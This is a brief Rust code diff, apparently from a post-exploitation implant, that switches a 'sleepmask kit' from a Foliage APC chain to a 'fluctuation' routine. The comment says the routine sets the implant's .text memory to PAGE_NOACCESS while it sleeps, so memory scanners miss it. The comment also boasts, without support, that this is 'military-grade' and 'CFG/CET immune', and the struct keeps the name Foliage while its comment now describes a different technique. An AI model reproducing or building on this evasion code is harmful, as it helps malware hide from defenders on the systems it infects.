@@ -46,14 +46,13 @@ impl SleepmaskKit for NoMask {
     }
 }
 
-/// Foliage sleepmask kit: delegates to [`crate::sleep`] which runs the gated
-/// Foliage executor. When [`crate::sleep::foliage_enabled`] is ON (default),
-/// `sleep()` runs the Foliage APC chain; when manually disabled it falls
-/// through to `NoMask` → identical behavior.
+/// Fluctuation sleepmask kit: flips .text to PAGE_NOACCESS during sleep,
+/// then back to RX on wake. Military-grade — CFG/CET immune, no ROP chains,
+/// no RC4 key material. When disabled, falls through to plain NtDelayExecution.
 pub struct Foliage;
 impl SleepmaskKit for Foliage {
     fn sleep_masked(&self, seconds: u32) {
-        crate::sleep::sleep(seconds);
+        crate::fluctuation::sleep(seconds);
     }
 }
 
